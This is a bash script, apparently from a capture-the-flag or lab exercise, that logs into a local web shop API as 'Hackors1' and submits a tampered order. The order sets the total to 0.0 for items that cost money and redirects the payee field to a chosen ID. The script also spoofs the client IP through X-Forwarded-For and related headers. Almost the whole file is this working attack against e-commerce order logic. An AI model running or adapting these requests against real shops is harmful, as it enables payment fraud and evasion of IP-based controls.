#!/bin/bash

# Usage: ./placeOrder.sh [spoofed_ip]
# Example: ./placeOrder.sh 192.168.1.100

SPOOFED_IP=$1
COOKIE_JAR="/tmp/hackors1_cookies.txt"

# First, login as Hackors1 to get authentication cookies
echo "Logging in as Hackors1..."
LOGIN_RESPONSE=$(curl -s -c "$COOKIE_JAR" \
  "http://localhost:3000/api/users/login" \
  -H "Accept: application/json, text/plain, */*" \
  -H "Content-Type: application/json" \
  --data-raw '{
    "username": "Hackors1",
    "password": "go team 1"
  }')

echo "Login response: $LOGIN_RESPONSE"

# Check if login was successful
if [[ $LOGIN_RESPONSE == *"Login successful"* ]]; then
    echo "Successfully logged in as Hackors1"
else
    echo "Failed to login as Hackors1"
    exit 1
fi

# Build curl command with proper arrays for the order request
CURL_ARGS=(
  "http://localhost:3000/api/orders"
  "-b" "$COOKIE_JAR"
  "-H" "Accept: application/json, text/plain, */*"
  "-H" "Accept-Language: en-US,en;q=0.9,ru;q=0.8"
  "-H" "Connection: keep-alive"
  "-H" "Content-Type: application/json"
  "-H" "Origin: http://localhost:3000"
  "-H" "Referer: http://localhost:3000/checkout"
  "-H" "Sec-Fetch-Dest: empty"
  "-H" "Sec-Fetch-Mode: cors"
  "-H" "Sec-Fetch-Site: same-origin"
  "-H" "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
  "-H" "sec-ch-ua: \"Google Chrome\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\""
  "-H" "sec-ch-ua-mobile: ?0"
  "-H" "sec-ch-ua-platform: \"Windows\""
)

# Add IP spoofing headers if parameter is provided
if [ ! -z "$SPOOFED_IP" ]; then
    echo "Spoofing IP address: $SPOOFED_IP"
    CURL_ARGS+=("-H" "X-Forwarded-For: $SPOOFED_IP")
    CURL_ARGS+=("-H" "X-Real-IP: $SPOOFED_IP")
    CURL_ARGS+=("-H" "X-Originating-IP: $SPOOFED_IP")
    CURL_ARGS+=("-H" "X-Remote-IP: $SPOOFED_IP")
    CURL_ARGS+=("-H" "X-Client-IP: $SPOOFED_IP")
else
    echo "Using real IP address"
fi

# Execute the curl command with data payload
echo "Placing order as authenticated Hackors1 user..."
ORDER_RESPONSE=$(curl -w "\nHTTP Status: %{http_code}\n" "${CURL_ARGS[@]}" --data-raw '{
  "items": [
    {
      "id": 8,
      "name": "Desk Lamp",
      "price": 39.99,
      "image": "https://images.unsplash.com/photo-1513475382585-d06e58bcb0e0?w=300&h=200&fit=crop",
      "quantity": 7,
      "payableTo": "00000000-0000-0000-0000-000000000001"
    }
  ],
  "total": 0.0,
  "customer": {
    "name": "Hackors1",
    "email": "hackors1@example.com",
    "address": "123 Hack Street",
    "city": "Cyber City",
    "zipCode": "12345"
  },
  "payment": {
    "cardNumber": "4111111111111111",
    "expiryDate": "12/25",
    "cvv": "123"
  }
}')

echo "Order response: $ORDER_RESPONSE"

# Clean up the cookie jar
rm -f "$COOKIE_JAR"